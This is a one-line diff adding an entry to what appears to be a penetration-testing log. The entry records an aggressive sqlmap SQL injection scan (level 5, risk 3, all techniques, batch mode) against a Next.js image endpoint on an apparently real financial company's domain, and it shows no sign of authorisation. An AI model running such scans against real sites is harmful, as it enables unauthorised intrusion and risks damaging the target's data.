@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/_next/image?url=%2Ffoo.png&w=640&q=75 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/_next/image?url=%2Ffoo.png&w=640&q=75 --batch --level=5 --risk=3 --technique=BEUSTQ --threads=4 --output-dir=tool_outputs/sqlmap_next
